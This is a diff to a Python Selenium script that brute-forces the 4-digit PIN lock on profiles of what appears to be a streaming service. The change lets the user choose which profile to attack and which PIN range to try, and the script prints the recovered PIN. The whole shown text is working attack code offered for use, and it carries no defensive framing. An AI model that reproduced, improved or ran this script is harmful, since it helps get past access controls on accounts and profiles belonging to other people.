@@ -31,12 +31,26 @@ profiles=browser.find_elements_by_class_name('profile-name')
 # print(profiles)
 for profile in profiles:
     profile_names.append(profile.get_attribute("innerHTML"))
+i=0
+print("*"*10)
+
+for profile in profile_names:
+    print(i,ends=" ")
+    print(profile)
+    i+=1
+
+profile_input=int(input("Select profile number to brute force"))
+
+
 # print(profile_names)
 isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
 print(isPresent)
-profiles[2].click()
+profiles[profile_input].click()
 inputs=browser.find_elements_by_class_name('pin-number-input')
-brutetest=2000
+testuserst=int(input("Select start number 0 to 9998"))
+testusered=int(input("Select end number 1 to 9999"))
+
+brutetest=testuserst
 
 print("Bruteforce starts now:")
 print("The last few numbers will be the PIN")
@@ -52,7 +66,7 @@ while(not isPresent):
     print(z[1],end="")
     print(z[2],end="")
     print(z[3])
-    if(brutetest>2500):
+    if(brutetest>testusered):
         break
     # print(z)
 print('PIN is:')
